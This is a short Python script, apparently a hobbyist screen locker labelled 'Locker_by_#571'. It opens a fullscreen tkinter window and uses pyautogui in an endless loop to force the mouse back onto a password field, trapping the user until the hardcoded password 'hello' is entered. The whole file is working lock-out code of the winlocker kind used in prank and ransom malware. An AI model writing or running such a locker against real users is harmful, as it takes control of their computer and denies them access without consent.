from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep


def callback():
    global k, entry
    if entry.get() == "hello":
        k = True


def on_closing():
    click(675, 420)
    moveTo(675, 420)
    root.attributes("-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW")
    root.update()
    root.bind(callback())


root = Tk()  # Создание окна
root.title("Locker")  # Заголовочное название
root.attributes("-fullscreen", True)  # Расширение под экран

entry = Entry(root, font=1)  # Поле ввода
entry.place(width=150, height=50, x=600, y=400)  # Координаты и размеры

label0 = Label(root, text="Locker_by_#571", font=1)  # Надпись 1
label0.grid(row=0, column=0)  # Координаты надписи 1

label1 = Label(root, text="Write down the password", font='Arial 20')  # Надпись 2
label1.place(x=520, y=300)  # Координаты надписи 2

root.update()
sleep(2)
click(675, 420)  # Обновление экрана программы
k = False
while not k:
    on_closing()
